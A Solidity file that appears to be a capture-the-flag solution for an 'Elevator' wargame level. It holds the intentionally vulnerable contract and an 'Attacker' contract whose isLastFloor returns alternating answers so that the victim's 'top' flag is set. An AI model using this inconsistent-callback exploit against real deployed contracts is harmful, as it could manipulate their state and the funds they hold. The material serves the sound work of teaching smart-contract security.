// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attacker{
	Elevator victim;
	bool toggler = false;
	constructor(address target) public {
		victim = Elevator(target);
	}

	function isLastFloor(uint _floor) external returns(bool){
		toggler = toggler == false ? true : false;
		return toggler == false ?  true :  false;
	}

	function caller() public {
		victim.goTo(123);
	}
}